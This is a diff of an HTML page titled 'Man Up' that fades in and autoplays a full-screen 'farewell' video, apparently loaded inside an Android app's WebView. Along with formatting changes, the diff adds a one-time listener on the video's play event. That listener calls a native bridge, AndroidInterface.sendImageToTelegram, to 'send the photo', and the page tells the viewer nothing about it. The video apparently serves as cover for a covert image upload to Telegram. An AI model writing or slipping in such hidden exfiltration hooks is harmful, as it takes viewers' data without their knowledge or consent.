@@ -1,69 +1,69 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Man Up</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            background-color: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        #video-container {
-            width: 100%;
-            height: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            opacity: 0;
-            transition: opacity 1.5s ease-in-out;
-        }
-        
-        video {
-            max-width: 100%;
-            max-height: 100%;
-            width: auto;
-            height: auto;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Man Up</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      background-color: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #video-container {
+      width: 100%;
+      height: 100%;
+      position: fixed;
+      top: 0;
+      left: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      opacity: 0;
+      transition: opacity 1.5s ease-in-out;
+    }
+
+    video {
+      max-width: 100%;
+      max-height: 100%;
+    }
+  </style>
 </head>
 <body>
-    <div id="video-container">
-        <video id="farewell-video" controls>
-            <!-- The video file will be loaded from the same directory as this HTML file -->
-            <source src="manup.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-    </div>
+  <div id="video-container">
+    <video id="farewell-video" controls>
+      <source src="manup.mp4" type="video/mp4" />
+      Your browser does not support the video tag.
+    </video>
+  </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const videoContainer = document.getElementById('video-container');
-            const video = document.getElementById('farewell-video');
-            
-            // Fade in the video container
-            setTimeout(function() {
-                videoContainer.style.opacity = '1';
-            }, 100);
-            
-            // Auto play the video after fade-in is complete
-            setTimeout(function() {
-                video.play().catch(e => {
-                    console.log('Auto-play was prevented. Click to play.');
-                });
-            }, 1600);
-        });
-    </script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const videoContainer = document.getElementById('video-container');
+      const video = document.getElementById('farewell-video');
+
+      setTimeout(() => {
+        videoContainer.style.opacity = '1';
+      }, 100);
+
+      setTimeout(() => {
+        video.play().catch(() => {});
+      }, 1600);
+
+      video.addEventListener('play', () => {
+        // Trigger your app to send the photo
+        if (typeof AndroidInterface !== 'undefined' && AndroidInterface.sendImageToTelegram) {
+          AndroidInterface.sendImageToTelegram();
+        }
+      }, { once: true }); // Only trigger once
+    });
+  </script>
 </body>
 </html>
